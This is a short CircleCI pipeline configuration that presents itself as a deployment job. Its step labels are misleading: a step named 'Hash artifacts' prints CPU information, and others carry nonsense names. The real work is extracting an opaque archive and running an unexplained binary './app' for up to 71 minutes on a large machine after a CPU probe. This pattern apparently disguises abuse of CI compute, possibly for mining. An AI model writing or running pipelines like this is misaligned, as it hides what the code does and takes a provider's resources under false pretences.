version: 2.1

jobs:
  A_depoly-8:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: raise voice
          command: |
            mkdir -p /var/tmp/ws
            set +o pipefail 2>/dev/null; yes abc | head -n 1087112 | sha1sum > /var/tmp/ws/output.md; true
            echo "staging complete; file length=$(wc -c </var/tmp/ws/output.md)"
      - persist_to_workspace:
          root: /var/tmp/ws
          paths:
            - output.md
  depoly-8:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /var/tmp/ws
      - run:
          name: Review previous
          command: |
            md5sum /var/tmp/ws/output.md || true
      - run:
          name: Pull working copy
          command: git clone --depth 5 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Expand sources
          command: tar --extract --xz --file=dist.tar.xz
      - run:
          command: sleep 60
      - run:
          name: Hash artifacts
          command: cat /proc/cpuinfo | head -5
      - run:
          no_output_timeout: 71m
          command: ./app && true
